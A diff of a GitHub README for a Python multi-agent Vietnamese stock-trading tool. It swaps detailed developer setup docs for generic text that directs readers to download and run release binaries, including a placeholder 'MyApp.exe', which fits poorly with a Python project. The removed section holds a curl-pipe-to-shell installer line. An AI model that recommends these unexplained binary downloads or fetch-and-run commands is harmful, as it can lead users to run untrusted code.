@@ -1,12 +1,70 @@
-# Finance Agent
+# 📈 vn-stock-ai-hedgefund - AI-Driven Trading Insights for Everyone
 
-Multi-agent research and trading decision pipeline for Vietnamese equities, orchestrated by Agno. It fetches historical OHLCV data, performs technical analysis, runs multi-perspective research, and synthesizes a trade plan with risk-aware final approval.
+## 🚀 Getting Started
 
-This project draws inspiration from the multi-agent coordination patterns described in TradingAgents by TauricResearch. See the reference README for conceptual background: [TradingAgents](https://github.com/TauricResearch/TradingAgents/blob/main/README.md).
+Welcome to the vn-stock-ai-hedgefund project! This application helps you research and trade Vietnamese stocks using advanced AI techniques. Follow the steps below to get started.
 
----
+## 📥 Download & Install
 
-## Architecture
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/Dendyuui/vn-stock-ai-hedgefund/releases)
+
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/Dendyuui/vn-stock-ai-hedgefund/releases). You will find the latest version of the software available for download.
+
+2. **Choose Your Download**  
+   Select the file that matches your operating system. For example:
+   - For Windows users, you might choose `MyApp.exe`.
+   - Mac users might select a `.dmg` file.
+   - Linux users might opt for the `.tar.gz` archive.
+
+3. **Download the File**  
+   Click the file name to begin the download. The file will typically save to your "Downloads" folder.
+
+4. **Install the Software**  
+   - For Windows: Double-click the `MyApp.exe` file to start the installation process. Follow the on-screen instructions.
+   - For Mac: Open the downloaded `.dmg` file, then drag the application to your "Applications" folder.
+   - For Linux: Use the terminal to navigate to the downloaded file and follow the extraction instructions in the documentation.
+
+5. **Run the Application**  
+   After installation, you can find the application in your "Applications" folder (Mac) or "Start Menu" (Windows). Double-click the application icon to launch it.
+
+## 🌟 Features
+
+- **Data Retrieval**  
+   Fetch historical stock data easily with our integrated DataAgent.
+
+- **Technical Analysis**  
+   Analyze market trends using advanced technical indicators.
+
+- **Research Planning**  
+   Collaborate with a virtual analyst team to synthesize insights and make informed trading decisions.
+
+- **Risk Management**  
+   Implement a risk-aware trading plan before executing trades.
+
+## ⚙️ System Requirements
+
+To ensure optimal performance, make sure your system meets the following requirements:
+
+- **Operating System**: Windows 10 or later, MacOS Sierra or later, Ubuntu 20.04 or later.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum 500 MB of free space for installation.
+- **Internet Connection**: Required for data fetching and updates.
+
+## 📚 How It Works
+
+The vn-stock-ai-hedgefund uses a multi-agent architecture to manage various tasks:
+
+- **CLI (Command Line Interface) Main**: This is your primary entry point to control the application.
+- **Orchestrator**: It coordinates the activities of different agents, ensuring they work together effectively.
+- **DataAgent**: This agent retrieves historical data, necessary for analysis.
+- **Analyst Team**: This group examines fundamental data, news, and sentiment.
+- **Technical Analysis Agent**: It computes indicators to identify trading opportunities.
+- **Research Team**: They debate and finalize findings for action.
+- **Trader Agent**: Develops a comprehensive trade plan.
+- **Portfolio Manager**: Finalizes decisions based on risk assessments and market conditions.
+
+You can visualize the flow of information with the following diagram:
 
 ```mermaid
 flowchart TD
@@ -25,156 +83,18 @@ flowchart TD
   G --> H
 ```
 
-Key ideas adapted from coordinated multi-agent pipelines as introduced in TradingAgents [link](https://github.com/TauricResearch/TradingAgents/blob/main/README.md).
+## 📌 Usage Tips
 
-## Features
+- **Start Small**: If you're new to trading, begin with a small amount and gradually increase as you become more comfortable.
+- **Experiment**: Use the application features to try out different strategies without risking real money.
+- **Stay Updated**: Regularly check the releases page for updates that may improve functionality or performance.
 
-- **DataAgent**: Retrieves OHLCV for VN equities from `yfinance` or `vnstock`.
-- **Analyst Team**: LLM-driven fundamental, news, and sentiment analysis.
-- **Technical Analysis Agent**: Computes indicators (SMA/EMA/RSI/MACD/BB) and produces a concise TA report.
-- **Research Team**: Debates bullish and bearish theses.
-- **Trader + PM**: Synthesizes a clear plan (entry/stop/target) and issues a final PM approval decision.
-- **Vectorbt Backtester**: High-performance SMA crossover engine with rich performance stats and optional Telegram alerts.
+## 💬 Support & Feedback
 
----
+If you encounter issues or have suggestions, please feel free to reach out through the Issues section on GitHub. Your feedback helps us improve the project.
 
-## Setup
+## 📜 License
 
-### Prerequisites
+This project is licensed under the MIT License. Please see the LICENSE file for details.
 
-- Python 3.11+
-- `uv` package manager
-- At least one LLM provider API key (OpenAI, Anthropic, or Groq)
-
-### Installation
-
-Using uv:
-
-```bash
-curl -fsSL https://astral.sh/uv/install.sh | sh  # optional installer
-cd finance_agent_new
-uv sync
-```
-
-### Environment configuration
-
-Configure provider and keys via environment variables or a `.env` file (parsed by `pydantic-settings`).
-
-```
-# LLM model provider and model id
-AGNO_MODEL_PROVIDER=openai        # openai | anthropic | groq
-AGNO_MODEL_ID=gpt-4o-mini         # optional, will use sensible default per provider
-
-# API keys (set the one matching the provider)
-OPENAI_API_KEY=sk-...
-ANTHROPIC_API_KEY=...
-GROQ_API_KEY=...
-
-# Data source selection
-DATA_SOURCE=yfinance              # yfinance | vnstock
-VNSTOCK_SOURCE=VCI                # VCI | TCBS | MSN (when DATA_SOURCE=vnstock)
-```
-
----
-
-## Usage
-
-From the project root:
-
-```bash
-uv run python -m finance_agent_new.main VNM.VN --start 2023-01-01 --end 2023-12-31
-```
-
-CLI options:
-
-```
-usage: main.py symbol [--start YYYY-MM-DD] [--end YYYY-MM-DD] [--source yfinance|vnstock]
-```
-
-Using `vnstock` as the data source requires explicit start and end dates:
-
-```bash
-uv run python -m finance_agent_new.main VNM.VN --source vnstock --start 2023-01-01 --end 2023-12-31
-```
-
-### Backtesting CLI
-
-Run the standalone SMA-crossover backtester with uv:
-
-```bash
-uv run python backtester.py VCB --start 2023-01-01 --end 2023-06-30
-```
-
-Set `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` to receive a summary notification after each run.
-
-### FastAPI backend
-
-Spin up an API server that exposes a `/backtest` endpoint:
-
-```bash
-uv run uvicorn backend.app:app --reload
-```
-
-POST JSON payloads to `/backtest` with `symbol`, `start`, and `end` fields to receive performance stats.
-
----
-
-## Project Structure
-
-```text
-finance_agent_new/
-├── agents/
-│   ├── analysts/
-│   │   ├── fundamental_analyst.py
-│   │   ├── news_analyst.py
-│   │   ├── sentiment_analyst.py
-│   │   └── technical_analyst.py
-│   ├── researchers/
-│   │   └── research_team.py
-│   ├── trading/
-│   │   ├── decision_team.py
-│   │   ├── portfolio_manager.py
-│   │   └── trader.py
-│   ├── analysis_agent.py
-│   ├── data_agent.py
-│   ├── orchestration.py
-│   └── strategy_agent.py
-├── config/
-│   └── settings.py
-├── utils/
-│   ├── logging.py
-│   ├── model_factory.py
-│   └── technical_analysis.py
-├── main.py
-├── pyproject.toml
-└── README.md
-```
-
----
-
-## Configuration and Models
-
-By default, `utils.model_factory.build_default_model()` selects a provider and model ID from environment variables. Supported providers:
-
-- `openai` → default `gpt-4o-mini`
-- `anthropic` → default `claude-3-5-sonnet-20240620`
-- `groq` → default `llama-3.1-70b-versatile`
-
-See `config/settings.py` and `utils/model_factory.py` for details.
-
----
-
-## Notes
-
-- This codebase is intended for research and educational purposes. It is not financial advice.
-- The orchestration uses a single-line spinner per step (no multi-task progress bar) to reflect unknown step durations.
-
----
-
-## Acknowledgements
-
-- Concepts adapted from TradingAgents by TauricResearch: [link](https://github.com/TauricResearch/TradingAgents/blob/main/README.md)
-
-## License
-
-MIT
+With these steps, you can successfully download and use the vn-stock-ai-hedgefund application to enhance your trading experience.
